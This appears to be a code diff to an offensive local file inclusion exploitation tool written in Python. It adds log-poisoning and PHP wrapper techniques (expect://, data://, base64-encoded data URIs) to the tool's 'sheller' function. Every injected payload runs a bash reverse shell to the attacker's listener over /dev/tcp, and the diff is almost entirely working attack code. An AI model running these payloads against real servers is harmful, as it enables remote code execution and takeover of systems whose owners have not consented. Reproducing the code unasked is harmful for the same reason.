@@ -22,6 +22,7 @@ import multiprocessing
 import requests
 import sys
 import subprocess
+import base64
 
 import core.variables as vars
 
@@ -53,6 +54,10 @@ def resetCounter():
         requestcount = 0
     finally:
         lock.release()
+
+
+def encode64(payload):
+    return base64.b64encode(payload.encode("utf-8")).decode("utf-8")
 
 
 def inpath(traverse, dir, file, nb, url, url2, s):
@@ -591,6 +596,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         4) Poisoned mail to web user
         others - see phase1()
     """
+    # TODO clean me up
     # resolve issues with inpath attack
     if attack == 2:
         # only root directory, else false positives
@@ -608,6 +614,8 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
     timeout = vars.timeout
 
     depth = 10
+    success = None
+
     if technique == 1:
         file = "/proc/self/environ"
     elif technique == 2:
@@ -616,8 +624,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         file = "/var/log/auth.log"
     elif technique == 4:
         file = "/var/mail/www-data"
-
-    success = None
+    elif technique == 5:
+        file = "/var/log/nginx/access.log"
+    elif technique == 6:
+        success = ["something here"]
 
     if authcookie != "":
         tmpjar = cookieFromFile(authcookie)
@@ -643,66 +653,20 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
             sys.exit("Timeout on initial check.")
 
-    for i in paylist:
-        d = 1
-        while d <= depth:
-            traverse = ''
-            j = 1
-            # chain traversal payloads
-            while j <= d:
-                traverse += i
-                j += 1
+    if technique != 6:
+        for i in paylist:
+            d = 1
+            while d <= depth:
+                traverse = ''
+                j = 1
+                # chain traversal payloads
+                while j <= d:
+                    traverse += i
+                    j += 1
 
-            # send attack requests - no nullbyte injection
-            requestlist = []
-            if nullist == []:
-                data = {}
-                if attack == 1:
-                    prep, p = query(traverse, "", file, "", keyword, url, url2, s)
-                    try:
-                        random_ua(s)
-                        r = s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                elif attack == 2:
-                    prep, p = inpath(traverse, "", file, "", url, url2, s)
-                    try:
-                        random_ua(s)
-                        r = s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                elif attack == 3:
-                    s.cookies.set(selected, traverse + file)
-                    p = traverse + file
-                    try:
-                        random_ua(s)
-                        r = s.get(url, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                elif attack == 4:
-                    p = traverse + file
-                    for prop in postdata.split("&"):
-                        pair = prop.split("=")
-                        if pair[1].strip() == "INJECT":
-                            pair[1] = p
-                        data[pair[0].strip()] = pair[1].strip()
-                    assert data != {}
-                    try:
-                        random_ua(s)
-                        req = requests.Request(method='POST', url=url, data=data)
-                        prep = s.prepare_request(req)
-                        newBody = unquote(prep.body)
-                        prep.body = newBody
-                        prep.headers["content-length"] = len(newBody)
-                        r = s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                try:
-                    requestlist.append((r, p, "", data, traverse))
-                except Exception:
-                    pass
-            else:
-                for nb in nullist:
+                # send attack requests - no nullbyte injection
+                requestlist = []
+                if nullist == []:
                     data = {}
                     if attack == 1:
                         prep, p = query(traverse, "", file, "", keyword, url, url2, s)
@@ -711,7 +675,6 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             r = s.send(prep, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
-                            continue
                     elif attack == 2:
                         prep, p = inpath(traverse, "", file, "", url, url2, s)
                         try:
@@ -719,7 +682,6 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             r = s.send(prep, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
-                            continue
                     elif attack == 3:
                         s.cookies.set(selected, traverse + file)
                         p = traverse + file
@@ -728,7 +690,6 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             r = s.get(url, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
-                            continue
                     elif attack == 4:
                         p = traverse + file
                         for prop in postdata.split("&"):
@@ -747,85 +708,136 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             r = s.send(prep, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
-                            continue
                     try:
                         requestlist.append((r, p, "", data, traverse))
                     except Exception:
                         pass
+                else:
+                    for nb in nullist:
+                        data = {}
+                        if attack == 1:
+                            prep, p = query(traverse, "", file, "", keyword, url, url2, s)
+                            try:
+                                random_ua(s)
+                                r = s.send(prep, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
+                        elif attack == 2:
+                            prep, p = inpath(traverse, "", file, "", url, url2, s)
+                            try:
+                                random_ua(s)
+                                r = s.send(prep, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
+                        elif attack == 3:
+                            s.cookies.set(selected, traverse + file)
+                            p = traverse + file
+                            try:
+                                random_ua(s)
+                                r = s.get(url, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
+                        elif attack == 4:
+                            p = traverse + file
+                            for prop in postdata.split("&"):
+                                pair = prop.split("=")
+                                if pair[1].strip() == "INJECT":
+                                    pair[1] = p
+                                data[pair[0].strip()] = pair[1].strip()
+                            assert data != {}
+                            try:
+                                random_ua(s)
+                                req = requests.Request(method='POST', url=url, data=data)
+                                prep = s.prepare_request(req)
+                                newBody = unquote(prep.body)
+                                prep.body = newBody
+                                prep.headers["content-length"] = len(newBody)
+                                r = s.send(prep, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
+                        try:
+                            requestlist.append((r, p, "", data, traverse))
+                        except Exception:
+                            pass
 
-            # analyze result
-            found = False
-            for (r, p, nb, data, traverse) in requestlist:
-                if attack == 3:
-                    s.cookies.set(selected, p)
-                if str(r.status_code).startswith("2"):
-                    if filecheck(r, con2, con3, p) and attack != 4 or filecheck(r, con2, con3, p, post=True) and attack == 4:
-                        success = (r, p, nb, data, traverse)
-                        found = True
-                        break
-                if verbose:
-                    if attack == 1 or attack == 2:
-                        print(color.END + "{}|: ".format(r.status_code)+r.url)
-                    elif attack == 3 or attack == 4:
-                        print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
-            d += 1
-            if found:
-                break
+                # analyze result
+                found = False
+                for (r, p, nb, data, traverse) in requestlist:
+                    if attack == 3:
+                        s.cookies.set(selected, p)
+                    if str(r.status_code).startswith("2"):
+                        if filecheck(r, con2, con3, p) and attack != 4 or filecheck(r, con2, con3, p, post=True) and attack == 4:
+                            success = (r, p, nb, data, traverse)
+                            found = True
+                            break
+                    if verbose:
+                        if attack == 1 or attack == 2:
+                            print(color.END + "{}|: ".format(r.status_code)+r.url)
+                        elif attack == 3 or attack == 4:
+                            print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
+                d += 1
+                if found:
+                    break
 
     if success:
-        if attack == 1:
-            prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
-        elif attack == 2:
-            prep = inpath(success[4], "", file, success[2], url, url2, s)[0]
-        elif attack == 3:
-            s.cookies.set(selected, success[1])
-            req = requests.Request(method='GET', url=url)
-            prep = s.prepare_request(req)
-        elif attack == 4:
-            req = requests.Request(method='POST', url=url, data=success[3])
-            prep = s.prepare_request(req)
-            newBody = unquote(prep.body)
-            prep.body = newBody
-            prep.headers["content-length"] = len(newBody)
+        if technique != 6:
+            if attack == 1:
+                prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
+            elif attack == 2:
+                prep = inpath(success[4], "", file, success[2], url, url2, s)[0]
+            elif attack == 3:
+                s.cookies.set(selected, success[1])
+                req = requests.Request(method='GET', url=url)
+                prep = s.prepare_request(req)
+            elif attack == 4:
+                req = requests.Request(method='POST', url=url, data=success[3])
+                prep = s.prepare_request(req)
+                newBody = unquote(prep.body)
+                prep.body = newBody
+                prep.headers["content-length"] = len(newBody)
 
         if technique == 1:
             prep.headers['User-agent'] = '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 1")
+                print("Timeout reached @technique {}".format(technique))
             prep.headers['User-agent'] = '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 1")
+                print("Timeout reached @technique {}".format(technique))
             prep.headers['User-agent'] = '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 1")
-        elif technique == 2:
+                print("Timeout reached @technique {}".format(technique))
+        elif technique == 2 or technique == 5:
             req = requests.Request(method='GET', url=url)
             prep2 = s.prepare_request(req)
             prep2.url = url + "/" + '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 2")
+                print("Timeout reached @technique {}".format(technique))
             prep2.url = url + "/" + '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 2")
+                print("Timeout reached @technique {}".format(technique))
             prep2.url = url + "/" + '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 2")
+                print("Timeout reached @technique {}".format(technique))
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 2")
+                print("Timeout reached @technique {}".format(technique))
         elif technique == 3:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -845,7 +857,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 3")
+                print("Timeout reached @technique {}".format(technique))
         elif technique == 4:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -863,7 +875,54 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique 4")
+                print("Timeout reached @technique {}".format(technique))
+        elif technique == 6:
+            wrappers = [
+                'expect://bash -i >& /dev/tcp/{}/{} 0>&1'.format(LISTENIP, LISTENPORT),
+                'data://text/plain,<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
+                'data://text/plain,<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
+                'data://text/plain,<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT),
+                'data://text/plain;base64,'
+                + encode64('<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)),
+                'data://text/plain;base64,'
+                + encode64('<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)),
+                'data://text/plain;base64,'
+                + encode64('<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT))
+            ]
+            if attack == 1:
+                for wrapper in wrappers:
+                    prep = query("", "", wrapper, "", keyword, url, url2, s)[0]
+                    try:
+                        s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached @technique {}".format(technique))
+            elif attack == 2:
+                for wrapper in wrappers:
+                    prep = inpath("", "", wrapper, "", url, url2, s)[0]
+                    try:
+                        s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached @technique {}".format(technique))
+            elif attack == 3:
+                for wrapper in wrappers:
+                    s.cookies.set(selected, wrapper)
+                    req = requests.Request(method='GET', url=url)
+                    prep = s.prepare_request(req)
+                    try:
+                        s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached @technique {}".format(technique))
+            elif attack == 4:
+                for wrapper in wrappers:
+                    req = requests.Request(method='POST', url=url, data=wrapper)
+                    prep = s.prepare_request(req)
+                    newBody = unquote(prep.body)
+                    prep.body = newBody
+                    prep.headers["content-length"] = len(newBody)
+                    try:
+                        s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached @technique {}".format(technique))
 
 
 def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
@@ -872,6 +931,6 @@ def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nul
     @params:
         (see other methods)
     """
-    for technique in range(1, 5):
+    for technique in range(1, 7):
         sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
                 authcookie, postdata)
